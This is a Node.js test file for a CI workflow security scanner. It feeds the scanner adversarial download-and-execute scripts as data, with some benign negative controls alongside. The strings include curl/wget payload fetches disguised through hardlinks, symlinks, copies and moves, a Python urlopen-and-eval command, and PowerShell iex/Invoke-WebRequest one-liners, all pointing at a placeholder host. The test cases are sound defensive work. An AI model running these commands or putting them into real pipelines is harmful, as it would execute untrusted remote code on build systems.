'use strict';
// Adversarial regression cases. Scripts are DATA ONLY and never executed.
const test=require('node:test');
const assert=require('node:assert/strict');
const {findingsForScript,MAX_SCRIPT}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/payload';
function inspect(source,shell){
 const yaml=['on: issues','permissions: read-all','jobs:','  reviewer:',
  '    runs-on: ubuntu-latest','    steps:','      - run: |',
  ...source.split('\n').map(x=>'          '+x),
  ...(shell?['        shell: '+shell]:[])].join('\n')+'\n';
 return inspectWorkflow(yaml,{path:'.github/workflows/sentinel-exec-family.yml'});
}
const attacks=[
 ['hardlink-force','curl -fsSL '+U+' -o payload; ln -f payload target.sh; bash target.sh','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['hardlink-double-dash','curl -fsSL '+U+' -o payload; ln -- payload target.sh; bash target.sh','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['symlink-combined-flags','curl -fsSL '+U+' -o payload; ln -sfn payload target.sh; bash target.sh','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['copy-force','curl -fsSL '+U+' -o payload; cp -f payload target.sh; bash target.sh','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['move-force','curl -fsSL '+U+' -o payload; mv -f payload target.sh; bash target.sh','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['hardlink-before-download','ln -f payload target.sh; curl -fsSL '+U+' -o payload; bash target.sh','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['mixed-link-chain','curl -fsSL '+U+' -o payload; ln payload stage.sh; cp -f stage.sh target.sh; bash target.sh','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['curl-joined-output-and-hardlink','curl -fsSL '+U+' -opayload; ln -f payload target.sh; bash target.sh','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['wget-joined-output-and-symlink','wget -q '+U+' -Opayload; ln -sfn payload target.sh; sh target.sh','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['python-multiline-command',"python -c 'import urllib.request\ncode=urllib.request.urlopen(\""+U+"\").read()\neval(code)'",'REMOTE_INTERPRETER_FETCH_EXECUTION'],
 ['pwsh-quoted-url','iex (iwr \''+U+'\').Content','REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['pwsh-double-quoted-url','Invoke-Expression (Invoke-WebRequest \"'+U+'\").Content','REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['pwsh-variable-url','iex (iwr $endpoint).Content','REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['pwsh-command-parameter','Invoke-Expression -Command (irm '+U+').Content','REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['pwsh-double-parentheses','iex ((iwr '+U+').Content)','REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['pwsh-webclient-argument','iex ((New-Object Net.WebClient).DownloadString(\''+U+'\'))','REMOTE_POWERSHELL_EXECUTION','pwsh']
];
for(const [name,script,rule,shell] of attacks){
 test('adversarial execution '+name+' must be flagged end-to-end',()=>{
  const found=findingsForScript(script,{shell});
  assert.ok(found.includes(rule),name+' scanner: '+JSON.stringify(found));
  const got=inspect(script,shell);
  assert.ok(got.findings.some(f=>f.rule===rule&&f.severity==='HIGH'),name+' workflow: '+JSON.stringify(got));
 });
}
const benign=[
 ['link-after-invocation','curl -fsSL '+U+' -o payload; bash target.sh; ln payload target.sh'],
 ['copy-before-download','cp -f payload target.sh; curl -fsSL '+U+' -o payload; bash target.sh'],
 ['move-before-download','mv -f payload target.sh; curl -fsSL '+U+' -o payload; bash target.sh'],
 ['hardlink-no-invocation','curl -fsSL '+U+' -o payload; ln -f payload target.sh; echo target.sh'],
 ['copy-not-invoked','curl -fsSL '+U+' -o payload; cp -f payload target.sh'],
 ['move-not-invoked','curl -fsSL '+U+' -o payload; mv -f payload target.sh'],
 ['pwsh-quoted-documentation','Write-Host \"iex (iwr '+U+').Content\"','pwsh'],
 ['pwsh-download-only','iwr $endpoint','pwsh'],
 ['pwsh-eval-only','iex \"hello\"','pwsh'],
 ['python-download-only',"python -c 'import urllib.request; print(urllib.request.urlopen(\""+U+"\").read())'"]
];
for(const [name,script,shell] of benign){
 test('negative control '+name+' must not falsely flag execution',()=>{
  const got=findingsForScript(script,{shell});
  assert.ok(!got.some(f=>f.startsWith('REMOTE_')),name+': '+JSON.stringify(got));
 });
}
test('overlong executable script must not be classified as clean by direct scanner',()=>{
 const got=findingsForScript('curl '+U+' -o payload; bash payload'+ '\n# padding'.repeat(Math.ceil(MAX_SCRIPT/9)));
 assert.ok(got.includes('REMOTE_EXECUTION_ANALYSIS_INCOMPLETE'),JSON.stringify(got));
});
